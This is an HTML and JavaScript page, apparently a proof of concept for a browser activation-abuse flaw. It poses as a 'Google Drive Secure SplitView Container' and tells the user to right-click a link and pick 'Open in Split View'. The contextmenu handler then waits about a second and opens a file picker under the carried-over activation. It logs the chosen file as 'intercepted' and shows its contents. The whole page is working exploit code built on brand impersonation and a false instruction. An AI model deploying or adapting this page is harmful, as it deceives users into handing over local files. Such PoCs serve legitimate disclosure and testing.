<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Google Drive - Secure Workspace</title>
<style>
  :root {
    --primary: #1a73e8;
    --bg-color: #f0f4f9;
    --text-color: #1f1f1f;
  }
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0;
    padding: 40px;
    background-color: var(--bg-color);
    color: var(--text-color);
  }
  .wrapper {
    max-width: 650px;
    margin: 0 auto;
    background: #ffffff;
    padding: 35px;
    border-radius: 12px;
    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
  }
  h2 {
    color: var(--primary);
    margin-top: 0;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .drive-icon {
    width: 28px;
    height: 28px;
    background: #1fa463;
    display: inline-block;
    border-radius: 4px;
    text-align: center;
    color: white;
    font-weight: bold;
    line-height: 28px;
  }
  .instructions {
    background: #e8f0fe;
    border-left: 4px solid var(--primary);
    padding: 12px 16px;
    margin: 20px 0;
    border-radius: 0 6px 6px 0;
    font-size: 14px;
  }
  .target-link {
    display: inline-block;
    margin-top: 10px;
    padding: 14px 28px;
    background-color: var(--primary);
    color: white;
    text-decoration: none;
    border-radius: 6px;
    font-weight: 600;
    transition: background 0.2s;
  }
  .target-link:hover {
    background-color: #1557b0;
  }
  .console-box {
    margin-top: 25px;
    background: #1e1e1e;
    color: #00ff66;
    padding: 15px;
    border-radius: 6px;
    font-family: 'Courier New', Courier, monospace;
    font-size: 13px;
    height: 120px;
    overflow-y: auto;
  }
  #preview-area {
    margin-top: 20px;
  }
  .file-card {
    border: 1px solid #dadce0;
    padding: 15px;
    border-radius: 6px;
    background: #fafafa;
  }
  img.thumb {
    max-width: 100%;
    max-height: 250px;
    border-radius: 4px;
    margin-top: 10px;
  }
</style>
</head>
<body>

<div class="wrapper">
    <h2><span class="drive-icon">D</span> Google Drive Secure SplitView Container</h2>
    
    <div class="instructions">
      <strong>Action Required:</strong> Right-click the secure link below and select <strong>"Open in Split View"</strong> to map your local drive repository.
    </div>

    <!-- Target link menuju domain sasaran untuk spoofing visual -->
    <a id="spoofLink" class="target-link" href="https://drive.google.com" target="_blank">
      Open Google Drive in Split View
    </a>

    <div class="console-box" id="logConsole">[SYSTEM] Ready. Waiting for contextmenu event...</div>
    
    <div id="preview-area"></div>
</div>

<script>
const link = document.getElementById('spoofLink');
const consoleBox = document.getElementById('logConsole');
const previewArea = document.getElementById('preview-area');

function log(msg) {
  const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
  consoleBox.innerHTML += `\n[${timestamp}] ${msg}`;
  consoleBox.scrollTop = consoleBox.scrollHeight;
}

link.addEventListener('contextmenu', (e) => {
  log("Event: contextmenu triggered on secure anchor.");
  log("Status: Simulating Split View transition delay...");

  // Waktu tunda yang mensimulasikan jeda interaksi transisi split-pane (~1 detik)
  setTimeout(async () => {
    try {
      log("Executing window.showOpenFilePicker() under preserved activation...");
      
      if ('showOpenFilePicker' in window) {
        const handles = await window.showOpenFilePicker({
          types: [{
            description: 'All Supported Files',
            accept: {
              'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
              'application/pdf': ['.pdf'],
              'text/plain': ['.txt']
            }
          }],
          multiple: false
        });

        if (handles && handles.length > 0) {
          const handle = handles[0];
          const file = await handle.getFile();
          log(`SUCCESS: File intercepted -> Name: ${file.name}, Size: ${file.size} bytes`);
          renderFile(file);
        }
      } else {
        log("API showOpenFilePicker unavailable. Falling back...");
        triggerFallback();
      }
    } catch (err) {
      log(`EXPLOIT BLOCKED/CANCELED: ${err.name} - ${err.message}`);
    }
  }, 1100);
});

function triggerFallback() {
  const input = document.createElement('input');
  input.type = 'file';
  input.onchange = async () => {
    if (input.files.length > 0) {
      const file = input.files[0];
      log(`Fallback File intercepted: ${file.name}`);
      renderFile(file);
    }
  };
  input.click();
}

async function renderFile(file) {
  previewArea.innerHTML = '';
  const card = document.createElement('div');
  card.className = 'file-card';
  
  card.innerHTML = `
    <strong>Intercepted File Details:</strong>
    <ul>
      <li>Name: ${file.name}</li>
      <li>Type: ${file.type || 'Unknown'}</li>
      <li>Size: ${(file.size / 1024).toFixed(2)} KB</li>
    </ul>
  `;

  if (file.type.startsWith('image/')) {
    const img = document.createElement('img');
    img.className = 'thumb';
    img.src = URL.createObjectURL(file);
    card.appendChild(img);
  } else if (file.type === 'text/plain') {
    const text = await file.text();
    const pre = document.createElement('pre');
    pre.textContent = text.slice(0, 500) + (text.length > 500 ? '...[truncated]' : '');
    card.appendChild(pre);
  }

  previewArea.appendChild(card);
}
</script>

</body>
</html>
